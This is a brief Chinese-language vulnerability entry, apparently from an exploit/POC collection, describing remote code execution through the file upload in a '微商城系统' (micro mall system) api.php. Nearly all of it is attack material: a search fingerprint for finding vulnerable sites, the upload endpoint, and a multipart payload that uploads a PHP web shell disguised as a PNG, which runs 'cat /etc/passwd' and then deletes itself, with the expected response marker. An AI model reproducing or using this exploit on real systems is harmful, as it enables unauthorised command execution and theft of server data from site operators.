# 微商城系统api.php存在RCE漏洞

微商城系统 ｜ 命令执行 ｜ —
- **指纹**：`body="/Mao_Public/js/jquery-2.1.1.min.js"`
- **请求**：`POST /api/api.php?mod=upload&type=1 HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: image/png
<?php system("cat /etc/passwd");unlink(__FILE__);?>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
```
- **响应特征**：200 /upload/